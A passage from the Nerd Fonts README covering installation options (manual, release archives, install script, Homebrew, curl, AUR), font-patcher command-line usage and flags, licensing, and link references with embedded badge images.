variations\/combinations\n  - **`1,264,440`** _possible_ variations\/combinations\n  - **`1,266,888`** total calculated combinations (2,448 + 1,264,440)\n- Combinations for each font are any combination of [Variations](#variations)\n\n### Variations\n\n- no flags given (defaults to only **Seti-UI + Custom** and **[Devicons][vorillaz-devicons]**)\n- **double _(variable\/proportional)_** or **single _(fixed\/monospaced)_** width glyphs\n- [Font Awesome][font-awesome]\n- [Font Awesome Extension][font-awesome-extension]\n- [Material Design Icons][font-material-design-icons]\n- [Weather][font-weather]\n- [GitHub Octicons][octicons]\n- [Font Logos][font-linux] (Formerly [Font Linux][font-linux])\n- [Powerline Extra Symbols][ryanoasis-powerline-extra-symbols]\n- [IEC Power Symbols][website-iecpower]\n- [Pomicons][gabrielelana-pomicons]\n- Windows Compatibility\n\n\n## Font Installation\n\n### `Option 1: Download and Install Manually`\n\n> Best option for **quickly** getting a specific **individual font**.\n\nDownload the specific [patched font](#patched-fonts) of your choice\n\n### `Option 2: Release Archive Download`\n\n> Best option if you want an **archive** or complete **font family** of variations (Bold, Italic, etc.).\n\nFonts are available for download as packages in the [latest release](https:\/\/github.com\/ryanoasis\/nerd-fonts\/releases\/latest)\n\n### `Option 3: Install Script`\n\n> Best option if you want to **automate** installing or for use in **scripts**.\n\n_Note_: Only for Linux & macOS (OS X)\n_Note_: **Requires cloning** the repo as of now\n\n#### All fonts:\n\n* Installs all the patched Fonts (_Warning: This is a lot of Fonts adding up to a large size_)\n\n```sh\n.\/install.sh\n```\n\n#### Single font:\n\n* Installs a single Font of your choice\n\n```sh\n.\/install.sh <FontName>\n.\/install.sh Hack\n.\/install.sh HeavyData\n```\n\n### `Option 4: Homebrew Fonts`\n\n> Best option if on **macOS** and want to use **Homebrew**.\n\nAll fonts are available via [Homebrew Cask Fonts](https:\/\/github.com\/Homebrew\/homebrew-cask-fonts) on macOS (OS X)\n\n```sh\nbrew tap homebrew\/cask-fonts\nbrew cask install font-hack-nerd-font\n```\n\n### `Option 5: Clone the Repo`\n\n> Best option for **full control**, **all** or **most** of the fonts, or **contributing** to development.\n\nCloning of this repository is **not** required nor efficient (mostly due to Repository size) if you are simply only interested in a limited set of fonts.\n\nHowever if you do want to clone the repo be sure to _shallow_ clone:\n```sh\ngit clone --depth 1\n```\n\n### `Option 6: Ad Hoc Curl Download`\n\n> Option if you want to use the **`curl` command** or for use in **scripts**.\n\n#### Linux\n\n```sh\nmkdir -p ~\/.local\/share\/fonts\ncd ~\/.local\/share\/fonts && curl -fLo \"Droid Sans Mono for Powerline Nerd Font Complete.otf\" https:\/\/github.com\/ryanoasis\/nerd-fonts\/raw\/master\/patched-fonts\/DroidSansMono\/complete\/Droid%20Sans%20Mono%20Nerd%20Font%20Complete.otf\n```\n\n_Note:_ deprecated alternative paths: `~\/.fonts`\n\n#### macOS (OS X)\n\n```sh\ncd ~\/Library\/Fonts && curl -fLo \"Droid Sans Mono for Powerline Nerd Font Complete.otf\" https:\/\/github.com\/ryanoasis\/nerd-fonts\/raw\/master\/patched-fonts\/DroidSansMono\/complete\/Droid%20Sans%20Mono%20Nerd%20Font%20Complete.otf\n```\n\n### `Option 7: Unofficial Arch User Repository (AUR)`\n\n> Option for **Arch Linux** and wanting to use **AUR packages**.\n\nThe following fonts are available via [AUR packages](https:\/\/aur.archlinux.org\/) on Arch Linux:\n\n* [Nerd Fonts Complete (double-width)](https:\/\/aur.archlinux.org\/packages\/nerd-fonts-complete\/)\n* [Nerd Fonts Complete (single-width)](https:\/\/aur.archlinux.org\/packages\/nerd-fonts-complete-mono-glyphs\/)\n* [Nerd Fonts DejaVu Complete](https:\/\/aur.archlinux.org\/packages\/nerd-fonts-dejavu-complete\/)\n* [Nerd Fonts Source Code Pro Complete](https:\/\/aur.archlinux.org\/packages\/nerd-fonts-source-code-pro\/)\n* [Nerd Fonts Git (out of date)](https:\/\/aur.archlinux.org\/packages\/nerd-fonts-git\/)\n\n### `Option 8: Patch Your Own Font`\n\n> The option for **patching** your **own font** or fully **customizing** the patched font.\n\nUse the provided Python command line script to generate a patched font from your own font to get the extra new glyphs\n\nSee: [Font Patcher](#font-patcher) for usage\n\n* use this option if you do __not__ want to use one of the [fonts provided](#patched-fonts)\n* you will still need to copy the generated font to the correct font directory on your system\n\n\n<h2 align=\"center\" id=\"font-patcher\">\n\t<img src=\"images\/nerd-fonts-patcher-logo.png\" alt=\"Nerd Fonts Patcher\">\n<\/h2>\n\nPatching the font of your own choosing for use with the [VimDevIcons \u27b6][vim-devicons]:\n* requires: Python 2 (or Python 3), `python-fontforge` package (version `20141231` or later, see\n  the [install instructions](http:\/\/designwithfontforge.com\/en-US\/Installing_Fontforge.html))\n* alternative install method on OSX: `brew install fontforge`\n* Usage:\n\n```\n.\/font-patcher PATH_TO_FONT\n```\n\n* Alternative usage: Execute the patcher with the FontForge binary using the script flag:\n\n```\n.\/fontforge -script font-patcher PATH_TO_FONT\n```\n\n\n```\nusage: font-patcher [-h] [-v] [-s] [-l] [-q] [-w] [-c] [--fontawesome]\n                    [--fontawesomeextension] [--fontlinux] [--octicons]\n                    [--powersymbols] [--pomicons] [--powerline]\n                    [--powerlineextra] [--material] [--weather]\n                    [--custom [CUSTOM]] [--postprocess [POSTPROCESS]]\n                    [--removeligs] [--configfile [CONFIGFILE]]\n                    [--progressbars | --no-progressbars] [--careful]\n                    [-ext [EXTENSION]] [-out [OUTPUTDIR]]\n                    font\n\nNerd Fonts Font Patcher: patches a given font with programming and development related glyphs\n\n* Website: https:\/\/www.nerdfonts.com\n* Version: 2.0.0\n* Development Website: https:\/\/github.com\/ryanoasis\/nerd-fonts\n* Changelog: https:\/\/github.com\/ryanoasis\/nerd-fonts\/blob\/master\/changelog.md\n\npositional arguments:\n  font                  The path to the font to patch (e.g., Inconsolata.otf)\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -v, --version         show program's version number and exit\n  -s, --mono, --use-single-width-glyphs\n                        Whether to generate the glyphs as single-width not double-width (default is double-width)\n  -l, --adjust-line-height\n                        Whether to adjust line heights (attempt to center powerline separators more evenly)\n  -q, --quiet, --shutup\n                        Do not generate verbose output\n  -w, --windows         Limit the internal font name to 31 characters (for Windows compatibility)\n  -c, --complete        Add all available Glyphs\n  --fontawesome         Add Font Awesome Glyphs (http:\/\/fontawesome.io\/)\n  --fontawesomeextension\n                        Add Font Awesome Extension Glyphs (https:\/\/andrelzgava.github.io\/font-awesome-extension\/)\n  --fontlinux, --fontlogos\n                        Add Font Linux and other open source Glyphs (https:\/\/github.com\/Lukas-W\/font-logos)\n  --octicons            Add Octicons Glyphs (https:\/\/octicons.github.com)\n  --powersymbols        Add IEC Power Symbols (https:\/\/unicodepowersymbol.com\/)\n  --pomicons            Add Pomicon Glyphs (https:\/\/github.com\/gabrielelana\/pomicons)\n  --powerline           Add Powerline Glyphs\n  --powerlineextra      Add Powerline Glyphs (https:\/\/github.com\/ryanoasis\/powerline-extra-symbols)\n  --material, --materialdesignicons, --mdi\n                        Add Material Design Icons (https:\/\/github.com\/templarian\/MaterialDesign)\n  --weather, --weathericons\n                        Add Weather Icons (https:\/\/github.com\/erikflowers\/weather-icons)\n  --custom [CUSTOM]     Specify a custom symbol font. All new glyphs will be copied, with no scaling applied.\n  --postprocess [POSTPROCESS]\n                        Specify a Script for Post Processing\n  --removeligs, --removeligatures\n                        Removes ligatures specified in JSON configuration file\n  --configfile [CONFIGFILE]\n                        Specify a file path for JSON configuration file (see sample: src\/config.sample.json)\n  --progressbars        Show percentage completion progress bars per Glyph Set\n  --no-progressbars     Don't show percentage completion progress bars per Glyph Set\n  --careful             Do not overwrite existing glyphs if detected\n  -ext [EXTENSION], --extension [EXTENSION]\n                        Change font file type to create (e.g., ttf, otf)\n  -out [OUTPUTDIR], --outputdir [OUTPUTDIR]\n                        The directory to output the patched font file to\n```\n\n#### Examples\n\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf -s -q\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf --use-single-width-glyphs --quiet\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf -w\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf --windows --quiet\n\t.\/font-patcher Droid\\ Sans\\ Mono\\ for\\ Powerline.otf --windows --pomicons --quiet\n\t.\/font-patcher Inconsolata.otf --fontawesome\n\t.\/font-patcher Inconsolata.otf --fontawesome --octicons --pomicons\n\t.\/font-patcher Inconsolata.otf\n\n\n<a name=\"gotta-patch-em-all\"><\/a>\n## Gotta Patch 'em All Font Patcher!\n\n* for Contributor or Developer use\n\n* re-patches **all** fonts in the unpatched directory:\n```\n.\/gotta-patch-em-all-font-patcher\\!.sh\n```\n\n* can optionally limit to specific font name pattern:\n```\n.\/gotta-patch-em-all-font-patcher\\!.sh Hermit\n```\n\n\n## Contributing\n\nSee [contributing.md](contributing.md)\n\n\n## Unstable File Paths\n\n:warning: Warning: File paths may change based on releases (especially **major** version bumps)\n\nReference the **release** branch and _not_ the ~~master~~ branch because paths are subject to change for each release\n\n* For example:\n  * :white_check_mark: Use: <code>https\\:\/\/github.com\/ryanoasis\/nerd-fonts\/blob\/<b>0.9.0<\/b>\/patched-fonts\/Hermit\/Medium\/complete\/Hurmit%20Medium%20Nerd%20Font%20Complete.otf<\/code>\n  * :x: Instead of: <code>https\\:\/\/github.com\/ryanoasis\/nerd-fonts\/blob\/<del>master<\/del>\/patched-fonts\/Hermit\/Medium\/complete\/Hurmit%20Medium%20Nerd%20Font%20Complete.otf<\/code>\n\n\n## Other Good Fonts to Patch\n\n* a list of additional good fonts to patch that cannot be provided or shared due to the license:\n * [Input Mono][input-mono] (license restriction)\n   * Possibly coming with external hosting :)\n * [PragmataPro][pragmatapro] (not free)\n * [Consolas][consolas] (proprietary)\n * [Operator Mono][operator] (not free)\n * [Dank Mono][dank] (not free)\n\n\n## Project Motivation\n\nSee [Wiki: Project Purpose][wiki-project-purpose]\n\n\n## Changelog\n\nSee [changelog.md](changelog.md)\n\n## License\n\n[MIT](LICENSE) \u00a9 Ryan L McIntyre\n\n<!--\nRepo References\n-->\n\n[vim-devicons]:https:\/\/github.com\/ryanoasis\/vim-devicons \"VimDevIcons Vim Plugin (external link) \u27b6\"\n[vorillaz-devicons]:https:\/\/vorillaz.github.io\/devicons\/\n[font-awesome]:https:\/\/github.com\/FortAwesome\/Font-Awesome\n[font-awesome-extension]:https:\/\/github.com\/AndreLZGava\/font-awesome-extension\n[font-material-design-icons]:https:\/\/github.com\/Templarian\/MaterialDesign\n[font-weather]:https:\/\/github.com\/erikflowers\/weather-icons\n[octicons]:https:\/\/github.com\/primer\/octicons\n[font-linux]:https:\/\/github.com\/Lukas-W\/font-logos\n[gabrielelana-pomicons]:https:\/\/github.com\/gabrielelana\/pomicons\n[Seti-UI]:https:\/\/atom.io\/themes\/seti-ui\n[ryanoasis-powerline-extra-symbols]:https:\/\/github.com\/ryanoasis\/powerline-extra-symbols\n[wiki]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\n[wiki-project-purpose]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/Project-Purpose\n[wiki-glyph-sets-codepoints]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/Glyph-Sets-and-Code-Points\n[wiki-icon-names-in-shell]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/Icon-Names-in-Shell\n[repo]:https:\/\/github.com\/ryanoasis\/nerd-fonts\n[gitter]:https:\/\/gitter.im\/ryanoasis\/nerd-fonts\n[code-climate]:https:\/\/codeclimate.com\/github\/ryanoasis\/nerd-fonts\n[travis-ci]:https:\/\/travis-ci.org\/ryanoasis\/nerd-fonts\n[twitter-intent]:https:\/\/twitter.com\/intent\/tweet?url=https%3A%2F%2Fgithub.com%2Fryanoasis%2Fnerd-fonts&via=%40nerdfonts&text=Nerd%20Fonts%20-%20Iconic%20font%20aggregator%2C%20collection%2C%20and%20patcher&hashtags=iconfont%20font%20github\n\n\n<!--\nWebsite References\n-->\n\n[website-iecpower]:https:\/\/unicodepowersymbol.com\/\n[Cheat Sheet]:https:\/\/nerdfonts.com\/#cheat-sheet\n[stickers]:https:\/\/www.redbubble.com\/people\/ryanoasis\/works\/30764810-nerd-fonts-iconic-font-aggregator\n\n<!--\nLink References\n-->\n\n[badge-version]:https:\/\/badge.fury.io\/gh\/ryanoasis%2Fnerd-fonts\n[badge-gitter]:https:\/\/gitter.im\/ryanoasis\/nerd-fonts?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge\n\n[img-version-badge]:https:\/\/img.shields.io\/github\/release\/ryanoasis\/nerd-fonts.svg?style=for-the-badge\n[img-gitter-badge]:https:\/\/img.shields.io\/gitter\/room\/nwjs\/nw.js.svg?style=for-the-badge\n[img-code-climate-badge]:https:\/\/img.shields.io\/codeclimate\/issues\/ryanoasis\/nerd-fonts.svg?style=for-the-badge\n[img-travis-ci]:https:\/\/img.shields.io\/travis\/ryanoasis\/nerd-fonts.svg?branch=master&style=for-the-badge\n[coc-badge]: https:\/\/img.shields.io\/badge\/code%20of-conduct-ff69b4.svg?style=for-the-badge\n[prs-badge]: https:\/\/img.shields.io\/badge\/PRs-welcome-brightgreen.svg?style=for-the-badge&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJzdmcyIiB3aWR0aD0iNjQ1IiBoZWlnaHQ9IjU4NSIgdmVyc2lvbj0iMS4wIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPiA8ZyBpZD0ibGF5ZXIxIj4gIDxwYXRoIGlkPSJwYXRoMjQxNyIgZD0ibTI5Ny4zIDU1MC44N2MtMTMuNzc1LTE1LjQzNi00OC4xNzEtNDUuNTMtNzYuNDM1LTY2Ljg3NC04My43NDQtNjMuMjQyLTk1LjE0Mi03Mi4zOTQtMTI5LjE0LTEwMy43LTYyLjY4NS01Ny43Mi04OS4zMDYtMTE1LjcxLTg5LjIxNC0xOTQuMzQgMC4wNDQ1MTItMzguMzg0IDIuNjYwOC01My4xNzIgMTMuNDEtNzUuNzk3IDE4LjIzNy0zOC4zODYgNDUuMS02Ni45MDkgNzkuNDQ1LTg0LjM1NSAyNC4zMjUtMTIuMzU2IDM2LjMyMy0xNy44NDUgNzYuOTQ0LTE4LjA3IDQyLjQ5My0wLjIzNDgzIDUxLjQzOSA0LjcxOTcgNzYuNDM1IDE4LjQ1MiAzMC40MjUgMTYuNzE0IDYxLjc0IDUyLjQzNiA2OC4yMTMgNzcuODExbDMuOTk4MSAxNS42NzIgOS44NTk2LTIxLjU4NWM1NS43MTYtMTIxLjk3IDIzMy42LTEyMC4xNSAyOTUuNSAzLjAzMTYgMTkuNjM4IDM5LjA3NiAyMS43OTQgMTIyLjUxIDQuMzgwMSAxNjkuNTEtMjIuNzE1IDYxLjMwOS02NS4zOCAxMDguMDUtMTY0LjAxIDE3OS42OC02NC42ODEgNDYuOTc0LTEzNy44OCAxMTguMDUtMTQyLjk4IDEyOC4wMy01LjkxNTUgMTEuNTg4LTAuMjgyMTYgMS44MTU5LTI2LjQwOC0yNy40NjF6IiBmaWxsPSIjZGQ1MDRmIi8%2BIDwvZz48L3N2Zz4%3D\n[twitter-badge]:https:\/\/img.shields.io\/twitter\/url\/http\/shields.io.svg?style=for-the-badge&logo=twitter\n[os-badge]:https:\/\/img.shields.io\/badge\/-OS-brightgreen.svg?style=for-the-badge&logoWidth=80&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIHdpZHRoPSIzOS43NDFtbSIgaGVpZ2h0PSIxMy4zNzdtbSIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgMzkuNzQxMjggMTMuMzc3MTI3IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj48bWV0YWRhdGE%2BPHJkZjpSREY%2BPGNjOldvcmsgcmRmOmFib3V0PSIiPjxkYzpmb3JtYXQ%2BaW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PjxkYzp0eXBlIHJkZjpyZXNvdXJjZT0iaHR0cDovL3B1cmwub3JnL2RjL2RjbWl0eXBlL1N0aWxsSW1hZ2UiLz48ZGM6dGl0bGUvPjwvY2M6V29yaz48L3JkZjpSREY%2BPC9tZXRhZGF0YT48ZyB0cmFuc2Zvcm09Im1hdHJpeCguMzMwODMgMCAwIC4zMzA4MyAyNi41MDggLTEuNzc0MikiPjxwb2x5Z29uIHBvaW50cz0iMTcuNCAzOC4zIDIxLjUgNDAuNiAyNy43IDQwLjYgMzMuNSAzNi4yIDM2LjEgMjkuMyAzMC4xIDIyIDI4LjQgMTcuOSAyMC4xIDE4LjIgMjAuMiAyMC41IDE4LjYgMjMuNSAxNi4xIDI4LjQgMTUuNiAzMi41IiBmaWxsPSIjZWNlZmYxIi8%2BPHBhdGggZD0ibTM0LjMgMjMuOWMtMS42LTIuMy0yLjktMy43LTMuNi02LjZzMC4yLTIuMS0wLjQtNC42Yy0wLjMtMS4zLTAuOC0yLjItMS4zLTIuOS0wLjYtMC43LTEuMy0xLjEtMS43LTEuMi0wLjktMC41LTMtMS4zLTUuNiAwLjEtMi43IDEuNC0yLjQgNC40LTEuOSAxMC41IDAgMC40LTAuMSAwLjktMC4zIDEuMy0wLjQgMC45LTEuMSAxLjctMS43IDIuNC0wLjcgMS0xLjQgMi0xLjkgMy4xLTEuMiAyLjMtMi4zIDUuMi0yIDYuMyAwLjUtMC4xIDYuOCA5LjUgNi44IDkuNyAwLjQtMC4xIDIuMS0wLjEgMy42LTAuMSAyLjEtMC4xIDMuMy0wLjIgNSAwLjIgMC0wLjMtMC4xLTAuNi0wLjEtMC45IDAtMC42IDAuMS0xLjEgMC4yLTEuOCAwLjEtMC41IDAuMi0xIDAuMy0xLjYtMSAwLjktMi44IDEuOS00LjUgMi4yLTEuNSAwLjMtNC0wLjItNS4yLTEuNyAwLjEgMCAwLjMgMCAwLjQtMC4xIDAuMy0wLjEgMC42LTAuMiAwLjctMC40IDAuMy0wLjUgMC4xLTEtMC4xLTEuM3MtMS43LTEuNC0yLjQtMi0xLjEtMC45LTEuNS0xLjNsLTAuOC0wLjhjLTAuMi0wLjItMC4zLTAuNC0wLjQtMC41LTAuMi0wLjUtMC4zLTEuMS0wLjItMS45IDAuMS0xLjEgMC41LTIgMS0zIDAuMi0wLjQgMC43LTEuMiAwLjctMS4ycy0xLjcgNC4yLTAuOCA1LjVjMCAwIDAuMS0xLjMgMC41LTIuNiAwLjMtMC45IDAuOC0yLjIgMS40LTIuOXMyLjEtMy4zIDIuMi00LjljMC0wLjcgMC4xLTEuNCAwLjEtMS45LTAuNC0wLjQgNi42LTEuNCA3LTAuMyAwLjEgMC40IDEuNSA0IDIuMyA1LjkgMC40IDAuOSAwLjkgMS43IDEuMiAyLjcgMC4zIDEuMSAwLjUgMi42IDAuNSA0LjEgMCAwLjMgMCAwLjgtMC4xIDEuMyAwLjIgMCA0LjEtNC4yLTAuNS03LjcgMCAwIDIuOCAxLjMgMi45IDMuOSAwLjEgMi4xLTAuOCAzLjgtMSA0LjEgMC4xIDAgMi4xIDAuOSAyLjIgMC45IDAuNCAwIDEuMi0wLjMgMS4yLTAuMyAwLjEtMC4zIDAuNC0xLjEgMC40LTEuNCAwLjctMi4zLTEtNi0yLjYtOC4zeiIgZmlsbD0iIzI2MzIzOCIvPjxnIGZpbGw9IiNlY2VmZjEiPjxlbGxpcHNlIGN4PSIyMS42IiBjeT0iMTUuMyIgcng9IjEuMyIgcnk9IjIiLz48ZWxsaXBzZSBjeD0iMjYuMSIgY3k9IjE1LjIiIHJ4PSIxLjciIHJ5PSIyLjMiLz48L2c%2BPGcgZmlsbD0iIzIxMjEyMSI%2BPGVsbGlwc2UgdHJhbnNmb3JtPSJtYXRyaXgoLS4xMjU0IC0uOTkyMSAuOTkyMSAtLjEyNTQgOC45NzU0IDM4Ljk5NykiIGN4PSIyMS43IiBjeT0iMTUuNSIgcng9IjEuMiIgcnk9Ii43Ii8%2BPGVsbGlwc2UgY3g9IjI2IiBjeT0iMTUuNiIgcng9IjEiIHJ5PSIxLjMiLz48L2c%2BPGcgZmlsbD0iI2ZmYzEwNyI%2BPHBhdGggZD0ibTM5LjMgMzcuNmMtMC40LTAuMi0xLjEtMC41LTEuNy0xLjQtMC4zLTAuNS0wLjItMS45LTAuNy0yLjUtMC4zLTAuNC0wLjctMC4yLTAuOC0wLjItMC45IDAuMi0zIDEuNi00LjQgMC0wLjItMC4yLTAuNS0wLjUtMS0wLjVzLTAuNyAwLjItMC45IDAuNi0wLjIgMC43LTAuMiAxLjdjMCAwLjggMCAxLjctMC4xIDIuNC0wLjIgMS43LTAuNSAyLjctMC41IDMuNyAwIDEuMSAwLjMgMS44IDAuNyAyLjEgMC4zIDAuMyAwLjggMC41IDEuOSAwLjVzMS44LTAuNCAyLjUtMS4xYzAuNS0wLjUgMC45LTAuNyAyLjMtMS43IDEuMS0wLjcgMi44LTEuNiAzLjEtMS45IDAuMi0wLjIgMC41LTAuMyAwLjUtMC45IDAtMC41LTAuNC0wLjctMC43LTAuOHoiLz48cGF0aCBkPSJtMTkuMiAzNy45Yy0xLTEuNi0xLjEtMS45LTEuOC0yLjktMC42LTEtMS45LTIuOS0yLjctMi45LTAuNiAwLTAuOSAwLjMtMS4zIDAuN3MtMC44IDEuMy0xLjUgMS44Yy0wLjYgMC41LTIuMyAwLjQtMi43IDFzMC40IDEuNSAwLjQgM2MwIDAuNi0wLjUgMS0wLjYgMS40LTAuMSAwLjUtMC4yIDAuOCAwIDEuMiAwLjQgMC42IDAuOSAwLjggNC4zIDEuNSAxLjggMC40IDMuNSAxLjQgNC42IDEuNXMzIDAgMy0yLjdjMC4xLTEuNi0wLjgtMi0xLjctMy42eiIvPjxwYXRoIGQ9Im0yMS4xIDE5LjhjLTAuNi0wLjQtMS4xLTAuOC0xLjEtMS40czAuNC0wLjggMS0xLjNjMC4xLTAuMSAxLjItMS4xIDIuMy0xLjFzMi40IDAuNyAyLjkgMC45YzAuOSAwLjIgMS44IDAuNCAxLjcgMS4xLTAuMSAxLTAuMiAxLjItMS4yIDEuNy0wLjcgMC4yLTIgMS4zLTIuOSAxLjMtMC40IDAtMSAwLTEuNC0wLjEtMC4zLTAuMS0wLjgtMC42LTEuMy0xLjF6Ii8%2BPC9nPjxnIGZpbGw9IiM2MzQ3MDMiPjxwYXRoIGQ9Im0yMC45IDE5YzAuMiAwLjIgMC41IDAuNCAwLjggMC41IDAuMiAwLjEgMC41IDAuMiAwLjUgMC4yaDAuOWMwLjUgMCAxLjItMC4yIDEuOS0wLjYgMC43LTAuMyAwLjgtMC41IDEuMy0wLjcgMC41LTAuMyAxLTAuNiAwLjgtMC43cy0wLjQgMC0xLjEgMC40Yy0wLjYgMC40LTEuMSAwLjYtMS43IDAuOS0wLjMgMC4xLTAuNyAwLjMtMSAwLjNoLTAuOWMtMC4zIDAtMC41LTAuMS0wLjgtMC4yLTAuMi0wLjEtMC4zLTAuMi0wLjQtMC4yLTAuMi0wLjEtMC42LTAuNS0wLjgtMC42IDAgMC0wLjIgMC0wLjEgMC4xbDAuNiAwLjZ6Ii8%2BPHBhdGggZD0ibTIzLjkgMTYuOGMwLjEgMC4yIDAuMyAwLjIgMC40IDAuM3MwLjIgMC4xIDAuMiAwLjFjMC4xLTAuMSAwLTAuMy0wLjEtMC4zIDAtMC4yLTAuNS0wLjItMC41LTAuMXoiLz48cGF0aCBkPSJtMjIuMyAxN2MwIDAuMSAwLjIgMC4yIDAuMiAwLjEgMC4xLTAuMSAwLjItMC4yIDAuMy0wLjIgMC4yLTAuMSAwLjEtMC4yLTAuMi0wLjItMC4yIDAuMS0wLjIgMC4yLTAuMyAwLjN6Ii8%2BPC9nPjxwYXRoIGQ9Im0zMiAzNC43djAuM2MwLjIgMC40IDAuNyAwLjUgMS4xIDAuNSAwLjYgMCAxLjItMC40IDEuNS0wLjggMC0wLjEgMC4xLTAuMiAwLjItMC4zIDAuMi0wLjMgMC4zLTAuNSAwLjQtMC42IDAgMC0wLjEtMC4xLTAuMS0wLjItMC4xLTAuMi0wLjQtMC40LTAuOC0wLjUtMC4zLTAuMS0wLjgtMC4yLTEtMC4yLTAuOS0wLjEtMS40IDAuMi0xLjcgMC41IDAgMCAwLjEgMCAwLjEgMC4xIDAuMiAwLjIgMC4zIDAuNCAwLjMgMC43IDAuMSAwLjIgMCAwLjMgMCAwLjV6IiBmaWxsPSIjNDU1YTY0Ii8%2BPC9nPjxnIHRyYW5zZm9ybT0ibWF0cml4KC4xMzk0NSAwIDAgLjEzOTQ1IDAgMS4xNjIzKSI%2BPHBhdGggZD0ibTAgMTIuNDAyIDM1LjY4Ny00Ljg2MDIgMC4wMTU2IDM0LjQyMy0zNS42NyAwLjIwMzEzeiIgZmlsbD0iI2Y4NjgyYyIvPjxwYXRoIGQ9Im0zOS45OTYgNi45MDU5IDQ3LjMxOC02LjkwNnY0MS41MjdsLTQ3LjMxOCAwLjM3NTY1eiIgZmlsbD0iIzkxYzMwMCIvPjxwYXRoIGQ9Im0zNS42NyA0NS45MzEgMC4wMjc3IDM0LjQ1My0zNS42Ny00LjkwNDEtMmUtMyAtMjkuNzh6IiBmaWxsPSIjMDBiNGYxIi8%2BPHBhdGggZD0ibTg3LjMyNiA0Ni4yNTUtMC4wMTExIDQxLjM0LTQ3LjMxOC02LjY3ODQtMC4wNjYzLTM0LjczOXoiIGZpbGw9IiNmZmMzMDAiLz48L2c%2BPHBhdGggZD0ibTI2LjEzNyAxMC4yODRjLTAuMTk5NTggMC40NjEwNi0wLjQzNTgxIDAuODg1NDctMC43MDk1MiAxLjI3NTctMC4zNzMwOCAwLjUzMTkzLTAuNjc4NTYgMC45MDAxMy0wLjkxMzk4IDEuMTA0Ni0wLjM2NDk0IDAuMzM1NjItMC43NTU5NSAwLjUwNzUtMS4xNzQ2IDAuNTE3MjctMC4zMDA1OSAwLTAuNjYzMDgtMC4wODU1My0xLjA4NS0wLjI1OTA0LTAuNDIzMzUtMC4xNzI2OS0wLjgxMjQtMC4yNTgyMy0xLjE2ODEtMC4yNTgyMy0wLjM3MzA4IDAtMC43NzMyMiAwLjA4NTU0LTEuMjAxMiAwLjI1ODIzLTAuNDI4NjQgMC4xNzM1MS0wLjc3Mzk1IDAuMjYzOTMtMS4wMzggMC4yNzI4OS0wLjQwMTUyIDAuMDE3MTItMC44MDE3My0wLjE1OTY2LTEuMjAxMi0wLjUzMTEyLTAuMjU0OTctMC4yMjIzOC0wLjU3Mzg4LTAuNjAzNjItMC45NTU5My0xLjE0MzctMC40MDk5LTAuNTc2NzQtMC43NDY5MS0xLjI0NTUtMS4wMTA5LTIuMDA4LTAuMjgyNzUtMC44MjM1Ni0wLjQyNDQ5LTEuNjIxMS0wLjQyNDQ5LTIuMzkzMSAwLTAuODg0NDEgMC4xOTExLTEuNjQ3MiAwLjU3Mzg4LTIuMjg2NCAwLjMwMDgzLTAuNTEzNDQgMC43MDEwNC0wLjkxODQ2IDEuMjAxOS0xLjIxNTggMC41MDA5LTAuMjk3MzMgMS4wNDIxLTAuNDQ4ODQgMS42MjUtMC40NTg1NCAwLjMxODkxIDAgMC43MzcxMyAwLjA5ODY1IDEuMjU2OCAwLjI5MjUyIDAuNTE4MjUgMC4xOTQ1MyAwLjg1MTAxIDAuMjkzMTggMC45OTY5IDAuMjkzMTggMC4xMDkwOCAwIDAuNDc4NzQtMC4xMTUzNSAxLjEwNTQtMC4zNDUzMSAwLjU5MjYyLTAuMjEzMjYgMS4wOTI4LTAuMzAxNTYgMS41MDI1LTAuMjY2NzggMS4xMTAzIDAuMDg5NiAxLjk0NDQgMC41MjcyOSAyLjQ5OTIgMS4zMTU4LTAuOTkyOTkgMC42MDE2Ni0xLjQ4NDIgMS40NDQ0LTEuNDc0NCAyLjUyNTQgOWUtMyAwLjg0MjA1IDAuMzE0NDMgMS41NDI4IDAuOTE0NzkgMi4wOTkxIDAuMjcyMDggMC4yNTgyMiAwLjU3NTkyIDAuNDU3OCAwLjkxMzk4IDAuNTk5NTQtMC4wNzMzMiAwLjIxMjYxLTAuMTUwNyAwLjQxNjI2LTAuMjMyOTggMC42MTE3NnptLTIuNTQ2NC0xMC4wMmMwIDAuNjYtMC4yNDExMiAxLjI3NjItMC43MjE3MyAxLjg0NjYtMC41OCAwLjY3ODA3LTEuMjgxNSAxLjA2OTktMi4wNDIzIDEuMDA4MS0wLjAwOTctMC4wNzkxOC0wLjAxNTMtMC4xNjI1MS0wLjAxNTMtMC4yNTAwOCAwLTAuNjMzNiAwLjI3NTgyLTEuMzExNyAwLjc2NTY0LTEuODY2MSAwLjI0NDU0LTAuMjgwNzEgMC41NTU1NS0wLjUxNDEyIDAuOTMyNzEtMC43MDAzMSAwLjM3NjM1LTAuMTgzNDEgMC43MzIzMy0wLjI4NDg1IDEuMDY3MS0wLjMwMjIxIDAuMDA5OCAwLjA4ODIzIDAuMDEzODUgMC4xNzY0NyAwLjAxMzg1IDAuMjY0ei